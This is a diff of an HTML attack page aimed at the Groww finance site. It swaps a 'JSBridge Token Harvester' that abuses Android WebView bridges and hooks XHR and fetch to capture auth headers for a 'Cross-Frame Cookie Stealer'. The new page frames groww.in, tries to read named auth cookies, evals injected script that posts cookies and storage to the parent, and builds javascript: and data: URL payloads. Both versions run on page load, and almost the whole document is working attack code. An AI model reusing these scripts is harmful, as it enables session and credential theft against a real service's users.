@@ -1,35 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JSBridge Token Harvester</title>
+    <title>🔓 Cookie Stealer via iFrame</title>
     <style>
         body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
-        .attack { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
+        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
         .success { border-color: #00ff00; background: #003300; }
+        iframe { width: 100%; height: 300px; border: 1px solid #666; }
         button { background: #ff0000; color: white; padding: 15px; border: none; margin: 5px; cursor: pointer; }
         pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; font-size: 12px; }
         .log { background: #000; color: #00ff00; padding: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <h1>🔓 JSBridge Token Harvester</h1>
-    <p>Attempting to extract tokens via JSBridge manipulation...</p>
+    <h1>🔓 Cross-Frame Cookie Stealer</h1>
+    <p>Attempting to extract cookies via iframe communication...</p>
     
-    <button onclick="triggerTokenRefresh()">🔄 Trigger Token Refresh</button>
-    <button onclick="interceptWebViewData()">🕵️ Intercept WebView Data</button>
-    <button onclick="manipulateFormData()">📋 Manipulate Form Processing</button>
-    <button onclick="triggerSessionActions()">⚡ Trigger Session Actions</button>
+    <button onclick="loadGrowwFrame()">📡 Load Groww Frame</button>
+    <button onclick="attemptCookieExtraction()">🍪 Extract Cookies</button>
+    <button onclick="triggerPostMessage()">📤 Trigger PostMessage</button>
+    <button onclick="injectJavaScript()">💉 Inject JavaScript</button>
     
     <div id="log" class="log">
-        <div>🚀 JSBridge Token Harvester Ready...</div>
+        <div>🚀 Cross-Frame Cookie Stealer Ready...</div>
     </div>
+    
+    <iframe id="growwFrame" style="display:none;"></iframe>
     
     <div id="results"></div>
 
     <script>
         let logContainer = document.getElementById('log');
         let resultsContainer = document.getElementById('results');
-        let harvested = {};
+        let growwFrame = document.getElementById('growwFrame');
+        let extractedData = {};
         
         function log(message) {
             const timestamp = new Date().toLocaleTimeString();
@@ -38,232 +42,269 @@
             console.log(message);
         }
         
-        function addResult(title, content, className = 'attack') {
+        function addResult(title, content, className = 'result') {
             const div = document.createElement('div');
             div.className = className;
             div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
             resultsContainer.appendChild(div);
         }
 
-        // 1. Try to trigger token refresh/update which might expose tokens
-        function triggerTokenRefresh() {
-            log("🔄 Attempting to trigger token refresh...");
+        // 1. Load Groww domain in iframe
+        function loadGrowwFrame() {
+            log("📡 Loading Groww domain in iframe...");
             
-            const refreshActions = [
-                'ACCESS_TOKEN_REFRESH_TOKEN_UPDATE',
-                'SESSION_EXPIRED',
-                'TWO_FACTOR_EXPIRE'
+            // Try different Groww URLs that might allow framing
+            const growwUrls = [
+                'https://groww.in/help/credit',
+                'https://credit.groww.in/help/credit',
+                'https://groww.in/help',
+                'https://credit.groww.in',
+                'https://groww.in'
             ];
             
-            refreshActions.forEach(action => {
-                try {
-                    if (window.AndroidJSI) {
-                        const payload = JSON.stringify({
-                            action: action,
-                            data: "token_harvest_attempt"
-                        });
-                        
-                        // Override console.log to catch any token responses
-                        const originalLog = console.log;
-                        console.log = function(...args) {
-                            originalLog.apply(console, args);
-                            args.forEach(arg => {
-                                if (typeof arg === 'string' && (arg.includes('Bearer') || arg.includes('token'))) {
-                                    log(`🎯 Potential token intercepted: ${arg.substring(0, 50)}...`);
-                                    harvested[`console_${Date.now()}`] = arg;
-                                }
-                            });
-                        };
-                        
-                        window.AndroidJSI.onReceiveMessage(payload);
-                        log(`✅ Sent ${action} via AndroidJSI`);
-                    }
-                } catch (e) {
-                    log(`❌ ${action} failed: ${e.message}`);
+            let currentIndex = 0;
+            
+            function tryNextUrl() {
+                if (currentIndex >= growwUrls.length) {
+                    log("❌ All Groww URLs failed to load in iframe");
+                    return;
                 }
-            });
-            
-            addResult("Token Refresh Attempts", "Triggered multiple refresh actions via JSBridge");
-        }
-
-        // 2. Try to intercept webview data by manipulating the flow
-        function interceptWebViewData() {
-            log("🕵️ Setting up data interception...");
-            
-            // Override XMLHttpRequest to catch API calls
-            const originalXHR = window.XMLHttpRequest;
-            window.XMLHttpRequest = function() {
-                const xhr = new originalXHR();
-                const originalOpen = xhr.open;
-                const originalSend = xhr.send;
                 
-                xhr.open = function(method, url, ...args) {
-                    log(`🌐 XHR Request: ${method} ${url}`);
-                    return originalOpen.apply(this, arguments);
+                const url = growwUrls[currentIndex];
+                log(`🔄 Trying to load: ${url}`);
+                
+                growwFrame.onload = function() {
+                    log(`✅ Successfully loaded: ${url}`);
+                    addResult("iFrame Loaded", `Successfully loaded Groww domain: ${url}`, 'success');
+                    
+                    // Try to access the iframe content
+                    setTimeout(() => attemptFrameAccess(), 1000);
                 };
                 
-                xhr.send = function(data) {
-                    if (data && (data.includes('token') || data.includes('auth'))) {
-                        log(`🎯 Auth data in XHR: ${data.substring(0, 100)}...`);
-                        harvested[`xhr_${Date.now()}`] = data;
-                    }
-                    return originalSend.apply(this, arguments);
+                growwFrame.onerror = function() {
+                    log(`❌ Failed to load: ${url}`);
+                    currentIndex++;
+                    setTimeout(tryNextUrl, 1000);
                 };
                 
-                return xhr;
-            };
-            
-            // Override fetch as well
-            if (window.fetch) {
-                const originalFetch = window.fetch;
-                window.fetch = function(url, options = {}) {
-                    log(`🌐 Fetch Request: ${url}`);
-                    
-                    if (options.body && (options.body.includes('token') || options.body.includes('auth'))) {
-                        log(`🎯 Auth data in fetch: ${options.body.substring(0, 100)}...`);
-                        harvested[`fetch_${Date.now()}`] = options.body;
-                    }
-                    
-                    if (options.headers) {
-                        Object.keys(options.headers).forEach(header => {
-                            if (header.toLowerCase().includes('auth') || header.toLowerCase().includes('token')) {
-                                log(`🎯 Auth header: ${header} = ${options.headers[header]}`);
-                                harvested[`header_${header}`] = options.headers[header];
-                            }
-                        });
-                    }
-                    
-                    return originalFetch.apply(this, arguments);
-                };
+                growwFrame.src = url;
+                currentIndex++;
             }
             
-            addResult("Network Interception", "Set up XHR and Fetch interception for auth data");
+            tryNextUrl();
         }
 
-        // 3. Try to manipulate form data processing to extract tokens
-        function manipulateFormData() {
-            log("📋 Attempting form data manipulation...");
+        // 2. Try to access iframe content
+        function attemptFrameAccess() {
+            log("🔍 Attempting to access iframe content...");
             
             try {
-                if (window.FORMOUT) {
-                    // Try different URLs that might trigger different processing
-                    const testUrls = [
-                        "https://credit.groww.in/exit",
-                        "https://groww.in/credit",
-                        "https://credit.groww.in/help/credit"
-                    ];
+                // Try to access iframe document
+                const frameDoc = growwFrame.contentDocument || growwFrame.contentWindow.document;
+                
+                if (frameDoc) {
+                    log("✅ Can access iframe document!");
                     
-                    testUrls.forEach(url => {
-                        // Try to trigger form processing with various auth-like data
-                        const testFormData = [
-                            "authToken=extract_this&sessionId=get_this",
-                            "lhtndhgfd=token123&arkeyt473rfh7834cd=2fa456",
-                            "username=test&password=test&token=harvest"
-                        ];
+                    // Try to get cookies from iframe
+                    const frameCookies = frameDoc.cookie;
+                    log(`🍪 Frame cookies: ${frameCookies || 'None'}`);
+                    
+                    if (frameCookies) {
+                        extractedData.frameCookies = frameCookies;
                         
-                        testFormData.forEach((data, index) => {
-                            try {
-                                window.FORMOUT.processFormData(url, data);
-                                log(`✅ Form data sent to ${url}: ${data.substring(0, 30)}...`);
-                            } catch (e) {
-                                log(`❌ Form processing failed for ${url}: ${e.message}`);
+                        // Look for auth tokens
+                        const authTokens = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID'];
+                        let foundTokens = [];
+                        
+                        authTokens.forEach(token => {
+                            if (frameCookies.includes(token)) {
+                                foundTokens.push(token);
                             }
                         });
-                    });
+                        
+                        if (foundTokens.length > 0) {
+                            addResult("🚨 AUTH TOKENS FOUND IN IFRAME", 
+                                `Found: ${foundTokens.join(', ')}<br><pre>${frameCookies}</pre>`, 'success');
+                        } else {
+                            addResult("Frame Cookies", `<pre>${frameCookies}</pre>`);
+                        }
+                    }
+                    
+                } else {
+                    log("❌ Cannot access iframe document (CORS/X-Frame-Options blocked)");
                 }
+                
             } catch (e) {
-                log(`❌ Form manipulation failed: ${e.message}`);
+                log(`❌ Frame access blocked: ${e.message}`);
+                
+                // Try alternative access methods
+                attemptPostMessageCommunication();
             }
-            
-            addResult("Form Data Manipulation", "Attempted various form processing attacks");
         }
 
-        // 4. Try to trigger various session-related actions that might expose data
-        function triggerSessionActions() {
-            log("⚡ Triggering session-related actions...");
+        // 3. Try postMessage communication
+        function attemptPostMessageCommunication() {
+            log("📤 Attempting postMessage communication...");
             
-            const sessionActions = [
-                'WEBVIEW_INTERACTABLE',
-                'WEBVIEW_SUCCESS',
-                'WEBVIEW_FAILURE',
-                'DEEPLINK',
-                'SHARE',
-                'EXTERNAL_AP_LINK'
-            ];
-            
-            sessionActions.forEach(action => {
-                try {
-                    if (window.AndroidJSI) {
-                        const payload = JSON.stringify({
-                            action: action,
-                            data: JSON.stringify({
-                                testData: "harvest_attempt",
-                                url: location.href,
-                                extractTokens: true
-                            })
-                        });
-                        
-                        window.AndroidJSI.onReceiveMessage(payload);
-                        log(`✅ Triggered ${action}`);
-                    }
-                } catch (e) {
-                    log(`❌ ${action} failed: ${e.message}`);
+            // Listen for messages from iframe
+            window.addEventListener('message', function(event) {
+                log(`📨 Received message from: ${event.origin}`);
+                log(`📨 Message data: ${JSON.stringify(event.data)}`);
+                
+                if (event.origin.includes('groww.in')) {
+                    extractedData.postMessages = extractedData.postMessages || [];
+                    extractedData.postMessages.push({
+                        origin: event.origin,
+                        data: event.data
+                    });
+                    
+                    addResult("PostMessage from Groww", 
+                        `Origin: ${event.origin}<br><pre>${JSON.stringify(event.data, null, 2)}</pre>`);
                 }
             });
             
-            addResult("Session Actions", "Triggered multiple session-related JSBridge actions");
-        }
-
-        // Monitor for any global variable changes that might indicate token updates
-        function monitorGlobalChanges() {
-            log("👀 Monitoring global variable changes...");
-            
-            const originalKeys = Object.keys(window);
-            
-            setInterval(() => {
-                const currentKeys = Object.keys(window);
-                const newKeys = currentKeys.filter(key => !originalKeys.includes(key));
+            // Try to send messages to iframe
+            if (growwFrame.contentWindow) {
+                const messages = [
+                    { action: 'getCookies' },
+                    { action: 'getAuthTokens' },
+                    { action: 'extractData' },
+                    'getCookies',
+                    'getAuthData'
+                ];
                 
-                newKeys.forEach(key => {
-                    const value = window[key];
-                    if (typeof value === 'string' && (value.includes('Bearer') || value.includes('token'))) {
-                        log(`🎯 New global with token: window.${key} = ${value.substring(0, 30)}...`);
-                        harvested[`global_${key}`] = value;
+                messages.forEach(msg => {
+                    try {
+                        growwFrame.contentWindow.postMessage(msg, '*');
+                        log(`📤 Sent message: ${JSON.stringify(msg)}`);
+                    } catch (e) {
+                        log(`❌ Failed to send message: ${e.message}`);
                     }
-                    originalKeys.push(key);
                 });
-            }, 1000);
+            }
         }
 
-        // Display harvested data
-        function showHarvestedData() {
-            if (Object.keys(harvested).length > 0) {
-                addResult("🚨 HARVESTED DATA", 
-                    `<pre>${JSON.stringify(harvested, null, 2)}</pre>`, 'success');
-                log(`🎯 Total harvested items: ${Object.keys(harvested).length}`);
+        // 4. Force cookie extraction
+        function attemptCookieExtraction() {
+            log("🍪 Forcing cookie extraction...");
+            
+            // Method 1: Try direct access
+            try {
+                if (growwFrame.contentWindow) {
+                    const cookies = growwFrame.contentWindow.document.cookie;
+                    if (cookies) {
+                        log(`🎯 Direct cookie access: ${cookies}`);
+                        extractedData.directCookies = cookies;
+                    }
+                }
+            } catch (e) {
+                log(`❌ Direct cookie access failed: ${e.message}`);
+            }
+            
+            // Method 2: Try JavaScript injection
+            try {
+                if (growwFrame.contentWindow) {
+                    growwFrame.contentWindow.eval(`
+                        console.log('Injected script running');
+                        if (window.parent) {
+                            window.parent.postMessage({
+                                type: 'cookieData',
+                                cookies: document.cookie,
+                                localStorage: JSON.stringify(localStorage),
+                                sessionStorage: JSON.stringify(sessionStorage)
+                            }, '*');
+                        }
+                    `);
+                    log("✅ JavaScript injection attempted");
+                }
+            } catch (e) {
+                log(`❌ JavaScript injection failed: ${e.message}`);
+            }
+        }
+
+        // 5. Trigger postMessage manually
+        function triggerPostMessage() {
+            log("📤 Manually triggering postMessage...");
+            
+            if (growwFrame.contentWindow) {
+                const payloads = [
+                    { action: 'EXTRACT_COOKIES', source: 'malicious' },
+                    { type: 'GET_AUTH_DATA' },
+                    { command: 'DUMP_STORAGE' },
+                    'extract_all_data'
+                ];
+                
+                payloads.forEach(payload => {
+                    try {
+                        growwFrame.contentWindow.postMessage(payload, '*');
+                        log(`📤 Posted: ${JSON.stringify(payload)}`);
+                    } catch (e) {
+                        log(`❌ PostMessage failed: ${e.message}`);
+                    }
+                });
+            }
+        }
+
+        // 6. JavaScript injection attempt
+        function injectJavaScript() {
+            log("💉 Attempting JavaScript injection...");
+            
+            // Try to inject via URL manipulation
+            const injectionUrls = [
+                'https://groww.in/help/credit#<script>parent.postMessage(document.cookie,"*")</script>',
+                'javascript:parent.postMessage(document.cookie,"*");',
+                'data:text/html,<script>parent.postMessage(document.cookie,"*")</script>'
+            ];
+            
+            injectionUrls.forEach(url => {
+                try {
+                    const testFrame = document.createElement('iframe');
+                    testFrame.style.display = 'none';
+                    testFrame.src = url;
+                    document.body.appendChild(testFrame);
+                    log(`💉 Injected frame with: ${url.substring(0, 50)}...`);
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(testFrame);
+                    }, 2000);
+                } catch (e) {
+                    log(`❌ Injection failed: ${e.message}`);
+                }
+            });
+        }
+
+        // 7. Display extracted data
+        function showExtractedData() {
+            if (Object.keys(extractedData).length > 0) {
+                addResult("🎯 EXTRACTED DATA SUMMARY", 
+                    `<pre>${JSON.stringify(extractedData, null, 2)}</pre>`, 'success');
+                log(`✅ Total extracted data points: ${Object.keys(extractedData).length}`);
             } else {
-                log("❌ No tokens harvested yet");
+                log("❌ No data extracted");
             }
         }
 
         // Auto-start
         window.addEventListener('load', function() {
-            log("🔓 JSBridge Token Harvester loaded");
-            log(`🎯 Target: ${location.href}`);
+            log("🔓 Cross-Frame Cookie Stealer loaded");
+            log(`🎯 Current URL: ${location.href}`);
             
-            // Start monitoring
-            monitorGlobalChanges();
-            
-            // Auto-trigger some attacks
+            // Start extraction sequence
             setTimeout(() => {
-                log("🚀 Starting automated attacks...");
-                interceptWebViewData();
-                setTimeout(() => triggerTokenRefresh(), 1000);
-                setTimeout(() => triggerSessionActions(), 2000);
-                setTimeout(() => manipulateFormData(), 3000);
-                setTimeout(() => showHarvestedData(), 5000);
+                log("🚀 Starting automated extraction...");
+                loadGrowwFrame();
+                
+                // Show results after attempts
+                setTimeout(() => showExtractedData(), 10000);
             }, 2000);
         });
+
+        // Monitor for any success
+        setInterval(() => {
+            if (Object.keys(extractedData).length > 0) {
+                showExtractedData();
+            }
+        }, 5000);
     </script>
 </body>
 </html>
